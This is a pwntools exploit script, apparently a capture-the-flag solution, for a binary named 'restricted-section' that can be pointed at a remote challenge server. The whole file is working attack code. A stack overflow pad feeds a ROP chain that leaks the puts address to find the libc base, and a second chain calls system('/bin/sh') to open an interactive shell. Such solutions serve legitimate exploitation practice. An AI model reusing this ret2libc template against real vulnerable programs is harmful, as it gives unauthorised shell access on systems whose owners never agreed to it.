from pwn import *

elf = ELF('./restricted-section')
rop = ROP(elf)
libc = ELF('./libc.so.6')
ld = ELF('./ld-linux-x86-64.so.2')
context.arch = 'amd64'
context.log_level = 'debug'

if args.REMOTE:
    io = remote('ccsc.mouflonarena.com', 31197)
else:
    io = process([ld.path, elf.path], env={'LD_PRELOAD': libc.path})

pad = b'A' * 72
main = elf.sym['main']
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

leak = flat([
    pad,
    pop_rdi,
    puts_got,
    puts_plt,
    main
    ])

io.sendlineafter(b'note: ', leak)
io.recvuntil(b'recognise."\n')
puts_leak = u64(io.recvline().strip(b'\n').ljust(8, b'\x00'))

log.success(f'puts@got: {hex(puts_leak)}')
libc.address = puts_leak - libc.sym['puts']
log.success(f'libc base: {hex(libc.address)}')

binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']

exploit = flat([
    pad,
    ret,
    pop_rdi,
    binsh,
    system
    ])

io.sendlineafter(b'note: ', exploit)

io.interactive()
